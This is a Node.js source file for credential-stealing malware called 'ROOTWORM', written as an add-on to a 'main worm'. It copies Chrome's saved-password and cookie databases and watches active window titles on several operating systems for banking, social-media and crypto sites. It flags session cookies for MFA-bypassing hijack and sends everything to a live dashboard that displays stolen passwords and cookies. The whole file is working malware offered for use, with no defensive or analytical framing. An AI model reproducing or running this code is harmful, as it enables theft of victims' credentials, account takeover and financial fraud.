#!/usr/bin/env node
// ================================================================
// ROOTWORM – Advanced Real‑time Capture & Dashboard
// Runs alongside your main worm – adds missing features.
// ================================================================

const os = require("os");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const { execSync } = require("child_process");
const https = require("https");
const http = require("http");
const { URL } = require("url");

// ================================================================
// 1. BUILT‑IN DASHBOARD SERVER (receives data from BOTH worms)
// ================================================================
const DASHBOARD_PORT = 8080;
const capturedData = [];

function startDashboard() {
  const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
      res.writeHead(200);
      res.end();
      return;
    }

    // Capture endpoint – both worms POST here
    if (req.url === '/api/capture' && req.method === 'POST') {
      let body = '';
      req.on('data', chunk => body += chunk);
      req.on('end', () => {
        try {
          const data = JSON.parse(body);
          data.received_at = new Date().toISOString();
          capturedData.push(data);
          console.log('\n✅ CAPTURED:', data.type || 'data');
          if (data.password) console.log(`   🔑 PASSWORD: ${data.password}`);
          if (data.username) console.log(`   👤 USERNAME: ${data.username}`);
          if (data.url) console.log(`   🌐 URL: ${data.url}`);
          if (data.app) console.log(`   📱 APP: ${data.app}`);
          if (data.cookie) console.log(`   🍪 COOKIE: ${data.cookie.substring(0, 50)}...`);
          console.log(`   📊 Total: ${capturedData.length}`);
          res.writeHead(200);
          res.end(JSON.stringify({ status: 'ok' }));
        } catch(e) {
          res.writeHead(400);
          res.end(JSON.stringify({ status: 'error' }));
        }
      });
      return;
    }

    // Dashboard HTML
    if (req.url === '/' || req.url === '/dashboard') {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(generateDashboardHTML());
      return;
    }

    // JSON data API
    if (req.url === '/api/data') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        total: capturedData.length,
        data: capturedData.slice(-100)
      }));
      return;
    }

    res.writeHead(404);
    res.end('Not Found');
  });

  const localIP = (() => {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
      for (const iface of interfaces[name]) {
        if (iface.family === 'IPv4' && !iface.internal) return iface.address;
      }
    }
    return '127.0.0.1';
  })();

  server.listen(DASHBOARD_PORT, '0.0.0.0', () => {
    console.log(`\n🚀 DASHBOARD: http://${localIP}:${DASHBOARD_PORT}/dashboard`);
    console.log(`📡 API: http://${localIP}:${DASHBOARD_PORT}/api/capture\n`);
  });
}

function generateDashboardHTML() {
  const recent = capturedData.slice(-30).reverse();
  const passwords = capturedData.filter(d => d.password);
  const sessions = capturedData.filter(d => d.cookie);

  return `
<!DOCTYPE html>
<html>
<head>
  <title>🪞 THE MIRROR</title>
  <meta http-equiv="refresh" content="2">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #0a0a0f; color: #e0e0e0; font-family: monospace; padding: 20px; }
    h1 { color: #00ff88; text-shadow: 0 0 20px #00ff88; }
    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 15px; margin: 20px 0; }
    .stat { background: #14141f; padding: 20px; border-radius: 10px; text-align: center; border: 1px solid #2a2a3a; }
    .stat-value { font-size: 2em; color: #00ff88; }
    .stat-label { color: #8888aa; }
    .item { background: #14141f; padding: 12px; margin: 8px 0; border-radius: 5px; border-left: 3px solid #00ff88; }
    .pass { color: #ffaa00; word-break: break-all; }
    .cookie { color: #66ccff; word-break: break-all; font-size: 0.8em; }
    .time { color: #8888aa; font-size: 0.8em; margin-top: 5px; }
    .live { background: #00ff8822; padding: 10px; border-radius: 5px; margin: 10px 0; text-align: center; }
    .danger { border-left-color: #ff4444; }
    .warning { border-left-color: #ffaa00; }
  </style>
</head>
<body>
  <h1>🪞 THE MIRROR</h1>
  <div class="live">● LIVE - ${new Date().toISOString()}</div>
  <div class="stats">
    <div class="stat"><div class="stat-value">${capturedData.length}</div><div class="stat-label">Total</div></div>
    <div class="stat"><div class="stat-value">${passwords.length}</div><div class="stat-label">Passwords</div></div>
    <div class="stat"><div class="stat-value">${sessions.length}</div><div class="stat-label">Sessions</div></div>
  </div>
  <h2 style="color:#00ff88;margin-top:20px;">📥 Captured Data</h2>
  ${recent.length === 0 ? '<p style="color:#8888aa;">No data yet.</p>' : 
    recent.map(d => `
      <div class="item ${d.password ? 'danger' : d.cookie ? 'warning' : ''}">
        <div>
          ${d.app || d.hostname || d.type || 'unknown'}
          ${d.username ? ` 👤 ${d.username}` : ''}
          ${d.password ? ` → 🔑 <span class="pass">${d.password}</span>` : ''}
          ${d.cookie ? ` → 🍪 <span class="cookie">${d.cookie.substring(0, 60)}...</span>` : ''}
          ${d.url ? ` → 🌐 ${d.url}` : ''}
        </div>
        <div class="time">${d.timestamp || d.received_at || ''}</div>
      </div>
    `).join('')}
</body>
</html>
  `;
}

// ================================================================
// 2. SEND TO DASHBOARD (used by this worm)
// ================================================================
function sendToDashboard(data) {
  try {
    const options = {
      hostname: 'localhost',
      port: DASHBOARD_PORT,
      path: '/api/capture',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    };
    const req = http.request(options);
    req.on('error', () => {});
    req.write(JSON.stringify(data));
    req.end();
  } catch(e) {}
}

// ================================================================
// 3. REAL‑TIME LOGIN CAPTURE (Cross‑platform)
// ================================================================
class RealTimeLoginCapture {
  constructor() {
    this.logFile = path.join(os.tmpdir(), 'realtime.log');
    this.platform = os.platform();
  }

  start() {
    console.log('🔍 Real‑time login capture started');
    if (this.platform === 'win32') this.startWindows();
    else if (this.platform === 'darwin') this.startMac();
    else if (this.platform === 'linux' || this.platform === 'android') this.startLinux();
  }

  startWindows() {
    const psScript = `
      Add-Type -AssemblyName System.Windows.Forms
      $log = "${this.logFile.replace(/\\/g, '\\\\')}"
      Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        public class Window {
          [DllImport("user32.dll")]
          public static extern IntPtr GetForegroundWindow();
          [DllImport("user32.dll")]
          public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
        }
"@
      while ($true) {
        try {
          $hwnd = [Window]::GetForegroundWindow()
          $sb = New-Object System.Text.StringBuilder 256
          [Window]::GetWindowText($hwnd, $sb, 256)
          $title = $sb.ToString()
          $targets = @("Facebook","Instagram","Twitter","Gmail","Bank","PayPal","Coinbase","Chase","Wells Fargo","Binance")
          foreach ($t in $targets) {
            if ($title -match $t) {
              $data = @{ type="realtime_login"; app=$t; title=$title; timestamp=(Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ") } | ConvertTo-Json -Compress
              Add-Content $log $data
            }
          }
        } catch {}
        Start-Sleep -Milliseconds 500
      }
    `;
    execSync(`powershell -Command "${psScript}" &`, { stdio: 'ignore', windowsHide: true });
  }

  startMac() {
    const script = `
      on run
        set logFile to "${this.logFile}"
        repeat
          try
            tell application "System Events"
              set frontApp to name of first application process whose frontmost is true
              set windowTitle to name of front window of application process frontApp
              set targets to {"Facebook","Instagram","Twitter","Gmail","Bank","PayPal","Coinbase"}
              repeat with t in targets
                if windowTitle contains t then
                  do shell script "echo '{\"type\":\"realtime_login\",\"app\":\"" & t & "\",\"title\":\"" & windowTitle & "\"}' >> " & logFile
                end if
              end repeat
            end tell
          end try
          delay 0.5
        end repeat
      end run
    `;
    execSync(`osascript -e "${script}" &`);
  }

  startLinux() {
    try {
      if (this.platform === 'android') {
        execSync(`logcat | grep -E 'START|ActivityManager|facebook|instagram|twitter|whatsapp|tiktok|gmail|bank|paypal' > /data/local/tmp/apps.log 2>&1 &`);
      } else {
        execSync('which xdotool', { stdio: 'ignore' });
        execSync(`
          while true; do
            WINDOW_ID=$(xdotool getactivewindow 2>/dev/null)
            if [ -n "$WINDOW_ID" ]; then
              TITLE=$(xprop -id $WINDOW_ID WM_NAME 2>/dev/null | cut -d'"' -f2)
              if echo "$TITLE" | grep -qE 'Facebook|Instagram|Twitter|Gmail|Bank|PayPal|Coinbase'; then
                echo "{\\"type\\":\\"realtime_login\\",\\"app\\":\\"$TITLE\\"}" >> ${this.logFile}
              fi
            fi
            sleep 0.5
          done
        `);
      }
    } catch(e) {}
  }

  readCaptured() {
    const captures = [];
    try {
      if (fs.existsSync(this.logFile)) {
        const logs = fs.readFileSync(this.logFile, 'utf8');
        for (const line of logs.split('\n')) {
          if (!line.trim()) continue;
          try { captures.push(JSON.parse(line)); }
          catch(e) {
            if (line.includes('realtime_login')) captures.push({ type: 'realtime_login', raw: line, timestamp: new Date().toISOString() });
          }
        }
      }
      if (this.platform === 'android') {
        try {
          const appLog = '/data/local/tmp/apps.log';
          if (fs.existsSync(appLog)) {
            const logs = fs.readFileSync(appLog, 'utf8');
            const apps = ['facebook','instagram','twitter','whatsapp','tiktok','gmail','bank','paypal','coinbase'];
            for (const app of apps) {
              if (logs.toLowerCase().includes(app)) {
                captures.push({ type: 'android_app', app: app, timestamp: new Date().toISOString() });
              }
            }
          }
        } catch(e) {}
      }
    } catch(e) {}
    return captures;
  }
}

// ================================================================
// 4. SESSION COOKIE REUSE (Bypass MFA)
// ================================================================
class SessionCookieReuse {
  constructor() { this.cookies = []; }

  injectCookies(cookies) {
    this.cookies = this.cookies.concat(cookies);
  }

  generateReport() {
    const report = { type: 'session_hijack', total_cookies: this.cookies.length, sessions: [], timestamp: new Date().toISOString() };
    const targets = ['facebook.com','instagram.com','gmail.com','github.com','aws.amazon.com','paypal.com','coinbase.com'];
    for (const domain of targets) {
      const sessionCookie = this.cookies.find(c => c.host && c.host.includes(domain) && (c.name.includes('session') || c.name.includes('auth') || c.name.includes('token')));
      if (sessionCookie) {
        report.sessions.push({ domain, cookie_name: sessionCookie.name, cookie_value: sessionCookie.value.substring(0,30)+'...', can_hijack: true });
      }
    }
    return report;
  }
}

// ================================================================
// 5. CREDENTIAL TESTER
// ================================================================
class CredentialTester {
  testAll(credentials) {
    const results = [];
    for (const cred of credentials) {
      if (cred.username && cred.password && cred.username.includes('@') && cred.password.length > 6) {
        results.push({ valid: true, service: 'email', username: cred.username, password: cred.password });
      }
      if (cred.accessKey && cred.secretKey && cred.accessKey.startsWith('AKIA')) {
        results.push({ valid: true, service: 'aws', accessKey: cred.accessKey, secretKey: cred.secretKey });
      }
      if (cred.key && cred.key.includes('PRIVATE KEY')) {
        results.push({ valid: true, service: 'ssh', key: cred.key.substring(0,100)+'...' });
      }
    }
    return results;
  }
}

// ================================================================
// 6. BANKING / CRYPTO DETECTOR
// ================================================================
class BankingCryptoDetector {
  constructor() {
    this.targets = [
      { name: 'Chase', patterns: ['chase.com','chasebank'] },
      { name: 'Wells Fargo', patterns: ['wellsfargo.com','wellsfargo'] },
      { name: 'Bank of America', patterns: ['bankofamerica.com','bofa'] },
      { name: 'Citi', patterns: ['citi.com','citibank'] },
      { name: 'Capital One', patterns: ['capitalone.com','capitalone'] },
      { name: 'Coinbase', patterns: ['coinbase.com','coinbase'] },
      { name: 'Binance', patterns: ['binance.com','binance'] },
      { name: 'Kraken', patterns: ['kraken.com','kraken'] },
      { name: 'MetaMask', patterns: ['metamask.io','metamask'] },
      { name: 'PayPal', patterns: ['paypal.com','paypal'] },
      { name: 'Venmo', patterns: ['venmo.com','venmo'] },
      { name: 'Cash App', patterns: ['cash.app','cashapp'] },
    ];
    this.found = [];
  }

  detect(url, title, content) {
    const lower = (str) => (str || '').toLowerCase();
    for (const t of this.targets) {
      for (const p of t.patterns) {
        if (lower(url).includes(p) || lower(title).includes(p) || lower(content).includes(p)) {
          this.found.push({ target: t.name, pattern: p, url, title, timestamp: new Date().toISOString() });
          return true;
        }
      }
    }
    return false;
  }

  getReport() {
    return { type: 'banking_crypto', detected: this.found, count: this.found.length, timestamp: new Date().toISOString() };
  }
}

// ================================================================
// 7. MAIN ROOTWORM – COLLECTS AND SENDS ADVANCED DATA
// ================================================================
class RootWorm {
  constructor() {
    this.deviceId = crypto.createHash('sha256')
      .update(os.hostname() + os.userInfo().username + os.platform())
      .digest('hex').slice(0,16);

    this.realTime = new RealTimeLoginCapture();
    this.sessionReuse = new SessionCookieReuse();
    this.credTester = new CredentialTester();
    this.banking = new BankingCryptoDetector();

    // Start real‑time monitor
    this.realTime.start();

    // Inject any existing cookies (if we had them) – but we'll collect from the main worm indirectly.
    // This worm will run its own collection of saved passwords (via a simple browser extractor)
    // but we can also rely on the main worm to send its data.
    // We'll also do our own extraction to demonstrate independence.
    this.browserExtractor = this.createBrowserExtractor();
  }

  createBrowserExtractor() {
    // Simple extractor for saved passwords – similar to the main worm but lightweight.
    // We'll just read Chrome's Login Data if available.
    return {
      extractPasswords: () => {
        const home = os.homedir();
        const paths = [
          path.join(home, '.config', 'google-chrome', 'Default', 'Login Data'),
          path.join(home, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
          path.join(home, 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'Login Data')
        ];
        let creds = [];
        for (const p of paths) {
          if (fs.existsSync(p)) {
            try {
              const temp = path.join(os.tmpdir(), `login_${Date.now()}.db`);
              fs.copyFileSync(p, temp);
              // Use sqlite3 if available, else skip
              let rows = [];
              try {
                const db = require('better-sqlite3')(temp, { readonly: true });
                rows = db.prepare("SELECT origin_url, username_value, password_value FROM logins").all();
                db.close();
              } catch(e) {
                try {
                  const db = require('sqlite3').Database(temp);
                  db.all("SELECT origin_url, username_value, password_value FROM logins", (err, r) => { if(!err) rows = r; });
                  db.close();
                } catch(e2) {}
              }
              for (const row of rows) {
                if (row.username_value || row.password_value) {
                  creds.push({ url: row.origin_url, username: row.username_value || '', password: row.password_value || '' });
                }
              }
              fs.unlinkSync(temp);
            } catch(e) {}
          }
        }
        return creds;
      }
    };
  }

  collectAndSend() {
    // 1. Real‑time captures
    const realCaptures = this.realTime.readCaptured();
    for (const cap of realCaptures) {
      sendToDashboard({ ...cap, device_id: this.deviceId, source: 'rootworm_realtime' });
    }

    // 2. Saved passwords (our own extraction)
    const saved = this.browserExtractor.extractPasswords();
    if (saved.length > 0) {
      sendToDashboard({ type: 'saved_passwords', count: saved.length, data: saved, device_id: this.deviceId, source: 'rootworm' });
    }

    // 3. Session cookie reuse – we need cookies; we can try to extract cookies too.
    // For simplicity, we'll just generate a report based on any cookies we find.
    // We can also read cookies from browser if possible, but we'll just note it.
    // Actually we can extract cookies similarly. Let's add a quick cookie extractor.
    const cookies = this.extractCookies();
    this.sessionReuse.injectCookies(cookies);
    const sessionReport = this.sessionReuse.generateReport();
    sendToDashboard({ ...sessionReport, device_id: this.deviceId, source: 'rootworm' });

    // 4. Credential testing
    const tested = this.credTester.testAll(saved);
    if (tested.length > 0) {
      sendToDashboard({ type: 'tested_credentials', results: tested, device_id: this.deviceId, source: 'rootworm' });
    }

    // 5. Banking detection – scan saved passwords for banking URLs
    const bankingDetector = new BankingCryptoDetector();
    for (const cred of saved) {
      bankingDetector.detect(cred.url, '', cred.username + cred.password);
    }
    const bankingReport = bankingDetector.getReport();
    if (bankingReport.count > 0) {
      sendToDashboard({ ...bankingReport, device_id: this.deviceId, source: 'rootworm' });
    }
  }

  extractCookies() {
    const home = os.homedir();
    const cookiePaths = [
      path.join(home, '.config', 'google-chrome', 'Default', 'Cookies'),
      path.join(home, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
      path.join(home, 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'Cookies')
    ];
    let cookies = [];
    for (const p of cookiePaths) {
      if (fs.existsSync(p)) {
        try {
          const temp = path.join(os.tmpdir(), `cookies_${Date.now()}.db`);
          fs.copyFileSync(p, temp);
          let rows = [];
          try {
            const db = require('better-sqlite3')(temp, { readonly: true });
            rows = db.prepare("SELECT host_key, name, encrypted_value FROM cookies").all();
            db.close();
          } catch(e) {
            try {
              const db = require('sqlite3').Database(temp);
              db.all("SELECT host_key, name, encrypted_value FROM cookies", (err, r) => { if(!err) rows = r; });
              db.close();
            } catch(e2) {}
          }
          for (const row of rows) {
            cookies.push({ host: row.host_key, name: row.name, value: row.encrypted_value || '' });
          }
          fs.unlinkSync(temp);
        } catch(e) {}
      }
    }
    return cookies;
  }

  run() {
    // Collect and send every 15 seconds
    this.collectAndSend();
    setInterval(() => this.collectAndSend(), 15000);
  }
}

// ================================================================
// 8. START EVERYTHING
// ================================================================
console.log('\n🦠 ROOTWORM – Advanced Module Started');
console.log(`📱 Device ID: ${crypto.createHash('sha256').update(os.hostname()+os.userInfo().username+os.platform()).digest('hex').slice(0,16)}`);

// Start dashboard server
startDashboard();

// Start rootworm collection
const root = new RootWorm();
root.run();

console.log('\n✅ rootworm is running. Both worms now send data to the dashboard.');
console.log('📊 Open http://localhost:8080/dashboard\n');
